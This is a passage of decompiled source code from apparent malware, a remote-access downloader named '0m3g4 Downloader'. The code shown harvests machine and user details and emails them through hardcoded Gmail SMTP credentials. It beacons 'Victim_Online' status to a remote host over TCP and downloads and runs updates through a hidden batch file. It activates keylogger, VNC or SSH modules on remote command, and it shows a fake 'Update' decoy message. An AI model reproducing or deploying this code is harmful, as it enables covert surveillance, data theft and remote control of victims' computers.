						case 25:
							goto IL_036f;
						case 26:
							goto IL_0392;
						case 27:
							goto IL_03b4;
						case 28:
							goto IL_03db;
						case 29:
							goto IL_03fb;
						case 30:
							goto IL_03fe;
						case 31:
							goto IL_0405;
						case 32:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 33:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_0405:
					num = 31;
					obj = null;
					break;
					IL_03fe:
					num = 30;
					obj2 = null;
					goto IL_0405;
					IL_000a:
					num = 2;
					InstalledVer = null;
					goto IL_0014;
					IL_0014:
					num = 3;
					InstalledVer = (string)Registry.GetValue("HKEY_CURRENT_USER\\SOFTWARE\\Om3g4", "CurrentVersion", "");
					goto IL_0036;
					IL_0036:
					num = 4;
					text = "--= Machine Details =--\r\n\r\n*** 0m3g4 Downloader Updated ***\r\n Old Version: [ " + MyVer + " ]\r\n New Version: [ " + InstalledVer + " ]\r\n\r\n---===========================---\r\n\r\nRegistered Owner: \r\n[ " + RegisteredOwner + " ]\r\n\r\nComputer Name: \r\n[ " + Environment.MachineName.ToString() + " ]\r\n\r\nUser Name: \r\n[ " + Environment.UserName.ToString() + " ]\r\n\r\nOperating System Name: \r\n[ " + ((ServerComputer)MyProject.Computer).get_Info().get_OSFullName().ToString() + " ]\r\n\r\n---===========================---";
					goto IL_00df;
					IL_00df:
					num = 5;
					obj2 = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("CDO.Message", ""));
					goto IL_00f8;
					IL_00f8:
					num = 6;
					obj = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("CDO.Configuration", ""));
					goto IL_0110;
					IL_0110:
					num = 7;
					obj3 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(obj, (Type)null, "Fields", new object[0], (string[])null, (Type[])null, (bool[])null));
					goto IL_012e;
					IL_012e:
					num = 8;
					text2 = "0m3g4 Downloader \r\nHas  Been Updated\r\n\r\n" + text;
					goto IL_013e;
					IL_013e:
					num = 9;
					text3 = "0m3g4 <The.0m3g4.Network@gmail.com>";
					goto IL_0149;
					IL_0149:
					num = 10;
					text4 = "0m3g4 <The.0m3g4.Network@gmail.com>";
					goto IL_0153;
					IL_0153:
					num = 11;
					text5 = "0m3g4 Downloader -= Update =-";
					goto IL_015e;
					IL_015e:
					num = 12;
					text6 = "http://schemas.microsoft.com/cdo/configuration/";
					goto IL_0169;
					IL_0169:
					num = 13;
					NewLateBinding.LateSet(obj3, (Type)null, "Item", new object[2]
					{
						text6 + "sendusing",
						2
					}, (string[])null, (Type[])null);
					goto IL_019f;
					IL_019f:
					num = 14;
					NewLateBinding.LateSet(obj3, (Type)null, "Item", new object[2]
					{
						text6 + "smtpserver",
						"smtp.gmail.com"
					}, (string[])null, (Type[])null);
					goto IL_01d4;
					IL_01d4:
					num = 15;
					NewLateBinding.LateSet(obj3, (Type)null, "Item", new object[2]
					{
						text6 + "smtpserverport",
						465
					}, (string[])null, (Type[])null);
					goto IL_020e;
					IL_020e:
					num = 16;
					NewLateBinding.LateSet(obj3, (Type)null, "Item", new object[2]
					{
						text6 + "smtpauthenticate",
						1
					}, (string[])null, (Type[])null);
					goto IL_0244;
					IL_0244:
					num = 17;
					NewLateBinding.LateSet(obj3, (Type)null, "Item", new object[2]
					{
						text6 + "sendusername",
						"the.0m3g4.network"
					}, (string[])null, (Type[])null);
					goto IL_0279;
					IL_0279:
					num = 18;
					NewLateBinding.LateSet(obj3, (Type)null, "Item", new object[2]
					{
						text6 + "sendpassword",
						"p1cc1!!o"
					}, (string[])null, (Type[])null);
					goto IL_02ae;
					IL_02ae:
					num = 19;
					NewLateBinding.LateSet(obj3, (Type)null, "Item", new object[2]
					{
						text6 + "smtpusessl",
						1
					}, (string[])null, (Type[])null);
					goto IL_02e4;
					IL_02e4:
					num = 20;
					NewLateBinding.LateCall(obj3, (Type)null, "Update", new object[0], (string[])null, (Type[])null, (bool[])null, true);
					goto IL_02ff;
					IL_02ff:
					num = 21;
					obj4 = obj2;
					goto IL_0307;
					IL_0307:
					num = 22;
					NewLateBinding.LateSet(obj4, (Type)null, "To", new object[1] { text3 }, (string[])null, (Type[])null);
					goto IL_032a;
					IL_032a:
					num = 23;
					NewLateBinding.LateSet(obj4, (Type)null, "From", new object[1] { text4 }, (string[])null, (Type[])null);
					goto IL_034c;
					IL_034c:
					num = 24;
					NewLateBinding.LateSet(obj4, (Type)null, "Subject", new object[1] { text5 }, (string[])null, (Type[])null);
					goto IL_036f;
					IL_036f:
					num = 25;
					NewLateBinding.LateSet(obj4, (Type)null, "TextBody", new object[1] { text2 }, (string[])null, (Type[])null);
					goto IL_0392;
					IL_0392:
					num = 26;
					NewLateBinding.LateSet(obj4, (Type)null, "Sender", new object[1] { text4 }, (string[])null, (Type[])null);
					goto IL_03b4;
					IL_03b4:
					num = 27;
					NewLateBinding.LateSet(obj4, (Type)null, "Configuration", new object[1] { RuntimeHelpers.GetObjectValue(obj) }, (string[])null, (Type[])null);
					goto IL_03db;
					IL_03db:
					num = 28;
					Conversions.ToInteger(NewLateBinding.LateGet(obj4, (Type)null, "Send", new object[0], (string[])null, (Type[])null, (bool[])null));
					goto IL_03fb;
					IL_03fb:
					obj4 = null;
					goto IL_03fe;
					end_IL_0001_2:
					break;
				}
				num = 32;
				obj3 = null;
				break;
				end_IL_0001:;
			}
			catch (object obj5) when (obj5 is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj5);
				try0001_dispatch = 1196;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private void ExchangeNotify()
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		object obj = default(object);
		object obj2 = default(object);
		string text = default(string);
		object obj3 = default(object);
		string text2 = default(string);
		string text3 = default(string);
		string text4 = default(string);
		string text5 = default(string);
		string text6 = default(string);
		object obj4 = default(object);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_000a;
				case 1175:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_000a;
						case 3:
							goto IL_0014;
						case 4:
							goto IL_0036;
						case 5:
							goto IL_00ca;
						case 6:
							goto IL_00e3;
						case 7:
							goto IL_00fb;
						case 8:
							goto IL_0119;
						case 9:
							goto IL_0129;
						case 10:
							goto IL_0134;
						case 11:
							goto IL_013e;
						case 12:
							goto IL_0149;
						case 13:
							goto IL_0154;
						case 14:
							goto IL_018a;
						case 15:
							goto IL_01bf;
						case 16:
							goto IL_01f9;
						case 17:
							goto IL_022f;
						case 18:
							goto IL_0264;
						case 19:
							goto IL_0299;
						case 20:
							goto IL_02cf;
						case 21:
							goto IL_02ea;
						case 22:
							goto IL_02f2;
						case 23:
							goto IL_0315;
						case 24:
							goto IL_0337;
						case 25:
							goto IL_035a;
						case 26:
							goto IL_037d;
						case 27:
							goto IL_039f;
						case 28:
							goto IL_03c6;
						case 29:
							goto IL_03e6;
						case 30:
							goto IL_03e9;
						case 31:
							goto IL_03f0;
						case 32:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 33:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_03f0:
					num = 31;
					obj = null;
					break;
					IL_03e9:
					num = 30;
					obj2 = null;
					goto IL_03f0;
					IL_000a:
					num = 2;
					InstalledVer = null;
					goto IL_0014;
					IL_0014:
					num = 3;
					InstalledVer = (string)Registry.GetValue("HKEY_CURRENT_USER\\SOFTWARE\\Om3g4", "CurrentVersion", "");
					goto IL_0036;
					IL_0036:
					num = 4;
					text = "--= Machine Details =--\r\n\r\n*** 0m3g4 Downloader Replacement ***\r\n Old Server: [ 0m3g4-Downloader ]\r\n New Server: [ " + ExchangeServer + " ]\r\n\r\n---===========================---\r\n\r\nRegistered Owner: \r\n[ " + RegisteredOwner + " ]\r\n\r\nComputer Name: \r\n[ " + Environment.MachineName.ToString() + " ]\r\n\r\nUser Name: \r\n[ " + Environment.UserName.ToString() + " ]\r\n\r\nOperating System Name: \r\n[ " + ((ServerComputer)MyProject.Computer).get_Info().get_OSFullName().ToString() + " ]\r\n\r\n---===========================---";
					goto IL_00ca;
					IL_00ca:
					num = 5;
					obj2 = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("CDO.Message", ""));
					goto IL_00e3;
					IL_00e3:
					num = 6;
					obj = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("CDO.Configuration", ""));
					goto IL_00fb;
					IL_00fb:
					num = 7;
					obj3 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(obj, (Type)null, "Fields", new object[0], (string[])null, (Type[])null, (bool[])null));
					goto IL_0119;
					IL_0119:
					num = 8;
					text2 = "0m3g4 Downloader \r\nHas  Been Replaced\r\n\r\n" + text;
					goto IL_0129;
					IL_0129:
					num = 9;
					text3 = "0m3g4 <The.0m3g4.Network@gmail.com>";
					goto IL_0134;
					IL_0134:
					num = 10;
					text4 = "0m3g4 <The.0m3g4.Network@gmail.com>";
					goto IL_013e;
					IL_013e:
					num = 11;
					text5 = "0m3g4 Downloader -= Replacement =-";
					goto IL_0149;
					IL_0149:
					num = 12;
					text6 = "http://schemas.microsoft.com/cdo/configuration/";
					goto IL_0154;
					IL_0154:
					num = 13;
					NewLateBinding.LateSet(obj3, (Type)null, "Item", new object[2]
					{
						text6 + "sendusing",
						2
					}, (string[])null, (Type[])null);
					goto IL_018a;
					IL_018a:
					num = 14;
					NewLateBinding.LateSet(obj3, (Type)null, "Item", new object[2]
					{
						text6 + "smtpserver",
						"smtp.gmail.com"
					}, (string[])null, (Type[])null);
					goto IL_01bf;
					IL_01bf:
					num = 15;
					NewLateBinding.LateSet(obj3, (Type)null, "Item", new object[2]
					{
						text6 + "smtpserverport",
						465
					}, (string[])null, (Type[])null);
					goto IL_01f9;
					IL_01f9:
					num = 16;
					NewLateBinding.LateSet(obj3, (Type)null, "Item", new object[2]
					{
						text6 + "smtpauthenticate",
						1
					}, (string[])null, (Type[])null);
					goto IL_022f;
					IL_022f:
					num = 17;
					NewLateBinding.LateSet(obj3, (Type)null, "Item", new object[2]
					{
						text6 + "sendusername",
						"the.0m3g4.network"
					}, (string[])null, (Type[])null);
					goto IL_0264;
					IL_0264:
					num = 18;
					NewLateBinding.LateSet(obj3, (Type)null, "Item", new object[2]
					{
						text6 + "sendpassword",
						"p1cc1!!o"
					}, (string[])null, (Type[])null);
					goto IL_0299;
					IL_0299:
					num = 19;
					NewLateBinding.LateSet(obj3, (Type)null, "Item", new object[2]
					{
						text6 + "smtpusessl",
						1
					}, (string[])null, (Type[])null);
					goto IL_02cf;
					IL_02cf:
					num = 20;
					NewLateBinding.LateCall(obj3, (Type)null, "Update", new object[0], (string[])null, (Type[])null, (bool[])null, true);
					goto IL_02ea;
					IL_02ea:
					num = 21;
					obj4 = obj2;
					goto IL_02f2;
					IL_02f2:
					num = 22;
					NewLateBinding.LateSet(obj4, (Type)null, "To", new object[1] { text3 }, (string[])null, (Type[])null);
					goto IL_0315;
					IL_0315:
					num = 23;
					NewLateBinding.LateSet(obj4, (Type)null, "From", new object[1] { text4 }, (string[])null, (Type[])null);
					goto IL_0337;
					IL_0337:
					num = 24;
					NewLateBinding.LateSet(obj4, (Type)null, "Subject", new object[1] { text5 }, (string[])null, (Type[])null);
					goto IL_035a;
					IL_035a:
					num = 25;
					NewLateBinding.LateSet(obj4, (Type)null, "TextBody", new object[1] { text2 }, (string[])null, (Type[])null);
					goto IL_037d;
					IL_037d:
					num = 26;
					NewLateBinding.LateSet(obj4, (Type)null, "Sender", new object[1] { text4 }, (string[])null, (Type[])null);
					goto IL_039f;
					IL_039f:
					num = 27;
					NewLateBinding.LateSet(obj4, (Type)null, "Configuration", new object[1] { RuntimeHelpers.GetObjectValue(obj) }, (string[])null, (Type[])null);
					goto IL_03c6;
					IL_03c6:
					num = 28;
					Conversions.ToInteger(NewLateBinding.LateGet(obj4, (Type)null, "Send", new object[0], (string[])null, (Type[])null, (bool[])null));
					goto IL_03e6;
					IL_03e6:
					obj4 = null;
					goto IL_03e9;
					end_IL_0001_2:
					break;
				}
				num = 32;
				obj3 = null;
				break;
				end_IL_0001:;
			}
			catch (object obj5) when (obj5 is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj5);
				try0001_dispatch = 1175;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public void SendStatus(string Status)
	{
		TcpClient tcpClient = new TcpClient();
		tcpClient = new TcpClient(RemoteNotifier, 11872);
		try
		{
			lock (tcpClient.GetStream())
			{
				StreamWriter streamWriter = new StreamWriter(tcpClient.GetStream());
				streamWriter.Write(Status);
				streamWriter.Flush();
			}
			tcpClient.Close();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void Victim_Online()
	{
		try
		{
			SendStatus(Environment.MachineName + "+" + Environment.UserName + "+" + ((ServerComputer)MyProject.Computer).get_Info().get_OSFullName() + "+" + IP + "+" + HQUpLinkPort + "+" + ServerID + "+Online");
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void Victim_Offline()
	{
		try
		{
			SendStatus(IP + "+" + ServerID + "+Offline");
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void Im_Online_Tick(object sender, EventArgs e)
	{
		Victim_Online();
	}

	private void CheckForUpdate()
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		FileInfo fileInfo = default(FileInfo);
		string fileName = default(string);
		string text = default(string);
		string text2 = default(string);
		string text3 = default(string);
		string text4 = default(string);
		string text5 = default(string);
		Process process = default(Process);
		string fileName2 = default(string);
		FileInfo fileInfo2 = default(FileInfo);
		FileStream stream = default(FileStream);
		StreamWriter streamWriter = default(StreamWriter);
		Process process2 = default(Process);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_000a;
				case 2417:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_000a;
						case 4:
						case 5:
							goto IL_0022;
						case 6:
							goto IL_0030;
						case 7:
							goto IL_004f;
						case 8:
							goto IL_006e;
						case 9:
							goto IL_008d;
						case 10:
							goto IL_00a2;
						case 11:
							goto IL_00ce;
						case 12:
							goto IL_00d9;
						case 13:
							goto IL_00ef;
						case 14:
						case 15:
							goto IL_0103;
						case 16:
							goto IL_011d;
						case 17:
							goto IL_0137;
						case 18:
							goto IL_0142;
						case 19:
							goto IL_0158;
						case 20:
						case 21:
							goto IL_016c;
						case 22:
							goto IL_0186;
						case 23:
							goto IL_01a0;
						case 24:
							goto IL_01ab;
						case 25:
							goto IL_01ce;
						case 27:
							goto IL_01e2;
						case 30:
							goto IL_0204;
						case 31:
							goto IL_022c;
						case 32:
							goto IL_023b;
						case 33:
							goto IL_024b;
						case 35:
							goto IL_025a;
						case 36:
							goto IL_0282;
						case 37:
							goto IL_0291;
						case 38:
							goto IL_02a1;
						case 40:
							goto IL_02b0;
						case 41:
							goto IL_02d8;
						case 42:
							goto IL_02e7;
						case 43:
							goto IL_02f7;
						case 45:
							goto IL_0306;
						case 46:
							goto IL_032e;
						case 48:
							goto IL_033d;
						case 51:
							goto IL_0360;
						case 54:
							goto IL_038f;
						case 55:
							goto IL_03be;
						case 57:
							goto IL_03ee;
						case 58:
							goto IL_0412;
						case 26:
						case 29:
						case 34:
						case 39:
						case 44:
						case 47:
						case 50:
						case 53:
						case 56:
						case 59:
						case 60:
							goto IL_0440;
						case 61:
							goto IL_0470;
						case 62:
							goto IL_0486;
						case 63:
						case 64:
							goto IL_049a;
						case 65:
							goto IL_04b0;
						case 66:
						case 67:
							goto IL_04c4;
						case 68:
							goto IL_04ed;
						case 69:
							goto IL_04f8;
						case 70:
							goto IL_050e;
						case 71:
							goto IL_055c;
						case 72:
							goto IL_056e;
						case 73:
							goto IL_057f;
						case 74:
							goto IL_0590;
						case 75:
							goto IL_05a1;
						case 76:
							goto IL_05ad;
						case 77:
							goto IL_05b8;
						case 78:
							goto IL_05d3;
						case 79:
							goto IL_05de;
						case 80:
							goto IL_05fb;
						case 81:
							goto IL_0608;
						case 82:
							goto IL_0623;
						case 83:
							goto IL_0633;
						case 84:
							goto IL_0643;
						case 85:
							goto IL_0653;
						case 86:
							goto IL_0663;
						case 87:
							goto IL_06a8;
						case 88:
							goto IL_06b8;
						case 89:
							goto IL_06d8;
						case 90:
							goto IL_06e8;
						case 91:
							goto IL_0708;
						case 92:
							goto IL_0718;
						case 93:
							goto IL_0723;
						case 94:
							goto IL_072d;
						case 95:
							goto IL_0738;
						case 96:
							goto IL_074e;
						case 97:
							goto IL_0760;
						case 98:
							goto IL_0771;
						case 99:
							goto IL_0782;
						case 100:
							goto IL_078e;
						case 101:
							goto IL_0799;
						case 102:
							goto IL_07a6;
						case 103:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 3:
						case 28:
						case 49:
						case 52:
						case 104:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_07a6:
					num = 102;
					fileInfo.Delete();
					break;
					IL_0799:
					num = 101;
					fileInfo = new FileInfo(fileName);
					goto IL_07a6;
					IL_000a:
					num = 2;
					if (!Conversions.ToBoolean(NetworkConnectivity))
					{
						goto end_IL_0001_3;
					}
					goto IL_0022;
					IL_0022:
					num = 5;
					ExchangeServer = "0m3g4-Downloader";
					goto IL_0030;
					IL_0030:
					num = 6;
					text = TempFolder + "\\" + ExchangeServer + ".txt";
					goto IL_004f;
					IL_004f:
					num = 7;
					text2 = TempFolder + "\\" + ExchangeServer + ".exe";
					goto IL_006e;
					IL_006e:
					num = 8;
					text3 = TempFolder + "\\" + ExchangeServer + ".rar";
					goto IL_008d;
					IL_008d:
					num = 9;
					text4 = TempFolder + "\\0m3g4-Version.txt";
					goto IL_00a2;
					IL_00a2:
					num = 10;
					text5 = Conversions.ToString(DateAndTime.get_Now().TimeOfDay.TotalMilliseconds) + ".old";
					goto IL_00ce;
					IL_00ce:
					num = 11;
					UpToDateVer = null;
					goto IL_00d9;
					IL_00d9:
					num = 12;
					if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists(text))
					{
						goto IL_00ef;
					}
					goto IL_0103;
					IL_00ef:
					num = 13;
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(text);
					goto IL_0103;
					IL_0103:
					num = 15;
					((ServerComputer)MyProject.Computer).get_Network().DownloadFile(UpdateCheck, text);
					goto IL_011d;
					IL_011d:
					num = 16;
					UpToDateVer = ((ServerComputer)MyProject.Computer).get_FileSystem().ReadAllText(text);
					goto IL_0137;
					IL_0137:
					num = 17;
					NewVer = null;
					goto IL_0142;
					IL_0142:
					num = 18;
					if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists(text4))
					{
						goto IL_0158;
					}
					goto IL_016c;
					IL_0158:
					num = 19;
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(text4);
					goto IL_016c;
					IL_016c:
					num = 21;
					((ServerComputer)MyProject.Computer).get_Network().DownloadFile(UpdateVersion, text4);
					goto IL_0186;
					IL_0186:
					num = 22;
					NewVer = ((ServerComputer)MyProject.Computer).get_FileSystem().ReadAllText(text4);
					goto IL_01a0;
					IL_01a0:
					num = 23;
					InstalledVer = null;
					goto IL_01ab;
					IL_01ab:
					num = 24;
					InstalledVer = (string)Registry.GetValue("HKEY_CURRENT_USER\\SOFTWARE\\Om3g4", "CurrentVersion", "");
					goto IL_01ce;
					IL_01ce:
					num = 25;
					if (!string.IsNullOrEmpty(InstalledVer))
					{
						goto IL_01e2;
					}
					goto IL_0440;
					IL_01e2:
					num = 27;
					if (string.IsNullOrEmpty(UpToDateVer) | string.IsNullOrEmpty(NewVer))
					{
						goto end_IL_0001_3;
					}
					goto IL_0204;
					IL_0204:
					num = 30;
					if (File.Exists(text) & UpToDateVer.Contains("Activate: KeyLogger " + RegisteredOwner))
					{
						goto IL_022c;
					}
					goto IL_025a;
					IL_022c:
					num = 31;
					ExchangeServer = "0m3g4-KeyLogger";
					goto IL_023b;
					IL_023b:
					num = 32;
					ExchangeFile = KeyLoggerFile;
					goto IL_024b;
					IL_024b:
					num = 33;
					ServerExchange();
					goto IL_0440;
					IL_025a:
					num = 35;
					if (File.Exists(text) & UpToDateVer.Contains("Activate: Vnc " + RegisteredOwner))
					{
						goto IL_0282;
					}
					goto IL_02b0;
					IL_0282:
					num = 36;
					ExchangeServer = "0m3g4-Vnc";
					goto IL_0291;
					IL_0291:
					num = 37;
					ExchangeFile = VncFile;
					goto IL_02a1;
					IL_02a1:
					num = 38;
					ServerExchange();
					goto IL_0440;
					IL_02b0:
					num = 40;
					if (File.Exists(text) & UpToDateVer.Contains("Activate: sSH " + RegisteredOwner))
					{
						goto IL_02d8;
					}
					goto IL_0306;
					IL_02d8:
					num = 41;
					ExchangeServer = "0m3g4-sSH";
					goto IL_02e7;
					IL_02e7:
					num = 42;
					ExchangeFile = sSHFile;
					goto IL_02f7;
					IL_02f7:
					num = 43;
					ServerExchange();
					goto IL_0440;
					IL_0306:
					num = 45;
					if (File.Exists(text) & UpToDateVer.Contains("Self-Destruct: " + RegisteredOwner))
					{
						goto IL_032e;
					}
					goto IL_033d;
					IL_032e:
					num = 46;
					SelfDestruct();
					goto IL_0440;
					IL_033d:
					num = 48;
					if (File.Exists(text) & UpToDateVer.Contains(InstalledVer))
					{
						goto end_IL_0001_3;
					}
					goto IL_0360;
					IL_0360:
					num = 51;
					if (!File.Exists(text) | !File.Exists(text4) | UpToDateVer.Contains("Update: #"))
					{
						goto end_IL_0001_3;
					}
					goto IL_038f;
					IL_038f:
					num = 54;
					if (File.Exists(text) & File.Exists(text4) & UpToDateVer.Contains("Update: " + RegisteredOwner))
					{
						goto IL_03be;
					}
					goto IL_03ee;
					IL_03be:
					num = 55;
					((ServerComputer)MyProject.Computer).get_Registry().get_CurrentUser().OpenSubKey("SOFTWARE\\Om3g4", writable: true)!.SetValue("CurrentVersion", NewVer);
					goto IL_0440;
					IL_03ee:
					num = 57;
					if (File.Exists(text) & File.Exists(text4) & UpToDateVer.Contains("Update: All"))
					{
						goto IL_0412;
					}
					goto IL_0440;
					IL_0412:
					num = 58;
					((ServerComputer)MyProject.Computer).get_Registry().get_CurrentUser().OpenSubKey("SOFTWARE\\Om3g4", writable: true)!.SetValue("CurrentVersion", NewVer);
					goto IL_0440;
					IL_0440:
					num = 60;
					File.Move(Application.get_StartupPath() + "\\" + appname, TempFolder + "\\" + text5);
					goto IL_0470;
					IL_0470:
					num = 61;
					if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists(text2))
					{
						goto IL_0486;
					}
					goto IL_049a;
					IL_0486:
					num = 62;
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(text2);
					goto IL_049a;
					IL_049a:
					num = 64;
					if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists(text3))
					{
						goto IL_04b0;
					}
					goto IL_04c4;
					IL_04b0:
					num = 65;
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(text3);
					goto IL_04c4;
					IL_04c4:
					num = 67;
					((ServerComputer)MyProject.Computer).get_Network().DownloadFile(UpdateFile, TempFolder + "\\0m3g4-Downloader.rar");
					goto IL_04ed;
					IL_04ed:
					num = 68;
					process = new Process();
					goto IL_04f8;
					IL_04f8:
					num = 69;
					fileName2 = ToolsFolder + "\\rar.exe";
					goto IL_050e;
					IL_050e:
					num = 70;
					process.StartInfo.Arguments = "e -pp1cc1!!o " + TempFolder + "\\0m3g4-Downloader.rar " + TempFolder + "\\";
					goto IL_055c;
					IL_055c:
					num = 71;
					process.StartInfo.FileName = fileName2;
					goto IL_056e;
					IL_056e:
					num = 72;
					process.StartInfo.UseShellExecute = false;
					goto IL_057f;
					IL_057f:
					num = 73;
					process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
					goto IL_0590;
					IL_0590:
					num = 74;
					process.StartInfo.CreateNoWindow = true;
					goto IL_05a1;
					IL_05a1:
					num = 75;
					process.Start();
					goto IL_05ad;
					IL_05ad:
					num = 76;
					process.WaitForExit();
					goto IL_05b8;
					IL_05b8:
					num = 77;
					fileInfo2 = new FileInfo(TempFolder + "\\0m3g4-Downloader.rar");
					goto IL_05d3;
					IL_05d3:
					num = 78;
					fileInfo2.Delete();
					goto IL_05de;
					IL_05de:
					num = 79;
					stream = new FileStream(TempFolder + "\\0m3g4-Restart.bat", FileMode.Create, FileAccess.Write);
					goto IL_05fb;
					IL_05fb:
					num = 80;
					streamWriter = new StreamWriter(stream);
					goto IL_0608;
					IL_0608:
					num = 81;
					streamWriter.BaseStream.Seek(0L, SeekOrigin.End);
					goto IL_0623;
					IL_0623:
					num = 82;
					streamWriter.WriteLine("tskill wscript");
					goto IL_0633;
					IL_0633:
					num = 83;
					streamWriter.WriteLine("tskill lsess");
					goto IL_0643;
					IL_0643:
					num = 84;
					streamWriter.WriteLine("tskill svchest");
					goto IL_0653;
					IL_0653:
					num = 85;
					streamWriter.WriteLine("ping 127.0.0.1 -n 7 >%tmp%\\nul");
					goto IL_0663;
					IL_0663:
					num = 86;
					streamWriter.WriteLine("del \"" + TempFolder + "\\" + text5 + "\"");
					goto IL_06a8;
					IL_06a8:
					num = 87;
					streamWriter.WriteLine("ping 127.0.0.1 -n 5 >%tmp%\\nul");
					goto IL_06b8;
					IL_06b8:
					num = 88;
					streamWriter.WriteLine("start " + TempFolder + "\\0m3g4-Downloader.exe");
					goto IL_06d8;
					IL_06d8:
					num = 89;
					streamWriter.WriteLine("ping 127.0.0.1 -n 60 >%tmp%\\nul");
					goto IL_06e8;
					IL_06e8:
					num = 90;
					streamWriter.WriteLine("start " + PersistentFolder + "\\OverTime.vbs");
					goto IL_0708;
					IL_0708:
					num = 91;
					streamWriter.WriteLine("del %0");
					goto IL_0718;
					IL_0718:
					num = 92;
					streamWriter.Close();
					goto IL_0723;
					IL_0723:
					num = 93;
					UpdateNotify();
					goto IL_072d;
					IL_072d:
					num = 94;
					process2 = new Process();
					goto IL_0738;
					IL_0738:
					num = 95;
					fileName = TempFolder + "\\0m3g4-Restart.bat";
					goto IL_074e;
					IL_074e:
					num = 96;
					process2.StartInfo.FileName = fileName;
					goto IL_0760;
					IL_0760:
					num = 97;
					process2.StartInfo.UseShellExecute = false;
					goto IL_0771;
					IL_0771:
					num = 98;
					process2.StartInfo.CreateNoWindow = true;
					goto IL_0782;
					IL_0782:
					num = 99;
					process2.Start();
					goto IL_078e;
					IL_078e:
					num = 100;
					process2.WaitForExit();
					goto IL_0799;
					end_IL_0001_2:
					break;
				}
				num = 103;
				Application.Exit();
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 2417;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private void CheckForUpdates(object sender, EventArgs e)
	{
		CheckForUpdate();
	}

	private void Decoy()
	{
		//IL_006d: Unknown result type (might be due to invalid IL or missing references)
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0009;
				case 153:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0009;
						case 3:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 4:
						case 5:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_0009:
					num = 2;
					if (!(appname.Contains("Java") | appname.Contains("java") | appname.Contains("Access") | appname.Contains("Update") | appname.Contains("update")))
					{
						goto end_IL_0001_3;
					}
					break;
					end_IL_0001_2:
					break;
				}
				num = 3;
				MessageBox.Show("    ID Code:\r\n\r\n306d-3367-34", "Update");
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 153;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private static T InlineAssignHelper<T>(ref T target, T value)
	{
		target = value;
		return value;
	}

	private void TheXFiles()
	{
		byte[] array = new byte[1024];
		string text = TempFolder + "\\0m3g4-X.exe";
		try
		{
